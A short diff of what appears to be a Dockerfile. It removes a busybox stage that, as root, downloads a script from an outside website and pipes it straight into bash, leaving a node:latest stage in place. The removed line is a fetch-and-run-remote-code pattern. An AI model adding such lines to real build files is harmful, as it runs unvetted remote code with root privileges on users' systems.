@@ -1,9 +1,3 @@
- 
-FROM busybox
-
-USER root
-RUN wget https://somewebsite.com/bash/hello.sh | bash
-
 FROM node:latest
 
 # Create app directory
